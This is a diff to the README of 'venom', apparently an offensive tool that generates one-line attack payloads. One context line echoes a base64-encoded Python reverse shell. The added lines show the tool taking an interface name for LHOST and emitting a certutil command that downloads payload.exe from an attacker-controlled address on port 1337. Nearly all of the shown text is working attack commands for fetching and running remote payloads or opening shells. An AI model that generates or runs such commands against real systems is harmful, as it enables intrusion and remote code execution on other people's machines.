@@ -93,10 +93,15 @@ echo cHl0aG9uIC1jICdpbXBvcnQgcHR5LHNvY2tldCxvcztzID0gc29ja2V0LnNvY2tldChzb2NrZXQ
 
 ```
 
+venom now supports add interface name instead of the full ip for LHOST as this is more conviniet and save some keystrokes.
+
+```sh
+⬢  venom  master ⦿ ./venom.py wincert tap0 1337
+
+certutil.exe -urlcache -split -f http://xxx.xxx.xxx.xxx:1337/payload.exe
 
 
-
-
+```
 
 
 **This content was created by Kindred Group Security. Please share if you enjoyed!**
